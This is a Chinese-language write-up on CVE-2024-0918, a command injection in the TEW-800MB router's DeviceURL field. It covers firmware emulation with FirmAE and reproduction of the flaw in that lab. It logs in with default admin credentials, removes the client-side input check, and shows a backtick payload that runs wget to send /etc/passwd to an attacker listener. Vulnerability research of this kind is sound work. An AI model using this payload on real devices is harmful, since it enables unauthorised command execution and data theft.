# CVE-2024-0918 TEW-800MB RCE漏洞分析

固件版本为1.0.1.0的TEW-800MB路由器存在命令注入漏洞。如果攻击者获得了web管理权限，他们可以将命令注入到httpd未知函数中的post请求参数DeviceURL中，从而获得shell权限。

固件下载https://www.trendnet.com/support/support-detail.asp?prod=100_RB-TEW-800MB

参考链接：

- https://blog.csdn.net/shelter1234567/article/details/136217009
- https://nvd.nist.gov/vuln/detail/CVE-2024-0918

## 漏洞环境搭建

固件环境模拟项目https://github.com/pr0v3rbs/FirmAE，跟着项目文档依次执行命令安装项目依赖包。

将下载好的固件放入项目，运行下面命令启动模拟环境。

```shell
sudo ./run.sh -d TRENDnet ../fw_tew800mb\(v1.0.1.0\)_08012013/FW_TEW800MB\(v1.0.1.0\)_08012013.bin
```

![](https://img-blog.csdnimg.cn/direct/a433c9de74864aa7a80f4013313db159.png)

## 漏洞复现

登录路由器管理页面 用户名密码都为admin，访问/adm/management.asp页面。

![](https://img-blog.csdnimg.cn/direct/ffe15e799b754f2d94c222fbd9a38d91.png)

将Device URL字段改为我们的payload 

注意：前端会有输入限制 删除相关js代码即可

```shell
`wget http://192.168.116.131:4444?$(cat /etc/passwd)`
```

![img](https://img-blog.csdnimg.cn/direct/6bad85a54d7b4c4493cb0bd036935b7e.png)